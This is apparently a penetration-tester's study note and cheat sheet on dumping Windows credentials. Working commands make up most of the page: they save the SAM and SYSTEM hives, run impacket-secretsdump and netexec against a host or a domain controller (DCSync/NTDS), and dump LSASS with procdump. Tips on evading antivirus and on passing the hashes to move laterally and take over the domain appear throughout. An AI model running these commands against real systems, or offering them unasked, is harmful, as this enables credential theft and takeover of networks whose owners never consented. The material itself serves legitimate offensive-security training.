# 🪟 Dumping Windows Hashes

> After reaching admin/SYSTEM (or with `SeBackup`), pull **local hashes (SAM+SYSTEM)** and **LSA/cached secrets**, and on a DC the **NTDS.dit**. Feed everything to pass-the-hash and cracking → lateral movement.

Part of [[Windows Privilege Escalation]]. Related: [[Credential Attacks]] · [[Active Directory]] · [[SMB]]

---

## 🧠 THINK
- **Local SAM** → local admin NT hash (great for PtH/reuse across the subnet).
- **LSA secrets / cached creds** → service-account and domain creds.
- **On a DC → NTDS.dit** = every domain hash → domain compromise ([[Active Directory]]).
- Never crack what you can **pass** — NT hashes work directly with PtH.

## 💥 DUMP — local SAM + SYSTEM
Save the hives (admin/SYSTEM, or via `SeBackup`):
```cmd
reg save HKLM\SAM C:\Windows\Temp\sam.hive
```
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```
Exfil the hives, then on Kali:
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## 💥 DUMP — remote (with admin creds/hash)
```bash
impacket-secretsdump DOMAIN/user:'pass'@$IP
```
```bash
impacket-secretsdump -hashes :<NThash> DOMAIN/user@$IP
```
```bash
netexec smb $IP -u user -p 'pass' --sam --lsa
```

## 💥 DUMP — Domain Controller (NTDS)
```bash
impacket-secretsdump -just-dc DOMAIN/user:'pass'@<DC_IP>
```
```bash
netexec smb <DC_IP> -u user -p 'pass' --ntds
```
(Requires DA/appropriate rights; this is DCSync — see [[Active Directory]].)

## 💥 LSASS (SeDebug / admin)
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
Exfil `lsass.dmp` → parse offline (pypykatz/mimikatz) for cleartext/NT hashes.

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Local admin NT hash | PtH across subnet ([[Credential Attacks]]) |
| Service/LSA creds | reuse ([[SMB]]/[[WinRM]]/DBs) |
| NTDS dumped (DC) | domain compromise → [[Active Directory]] |
| LSASS cleartext | direct login/reuse |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `reg save` denied | need admin/SYSTEM/SeBackup → [[Windows Special Privileges]] |
| secretsdump auth fails | check format/local-auth → [[Credentials Rejected]] |
| AV blocks procdump | use `reg save` SAM route, or comsvcs.dll LSASS dump; rename tool |
| Hashes won't crack | **pass** them instead (PtH); crack on Kali with bigger lists |

## 📇 CHEAT SHEET
```cmd
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
```
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```
```bash
impacket-secretsdump DOMAIN/user:'pass'@$IP        # remote ; -just-dc on a DC
```
**Kill shot:** SAM/LSA/NTDS hashes → PtH + reuse → lateral / domain ([[Active Directory]]).
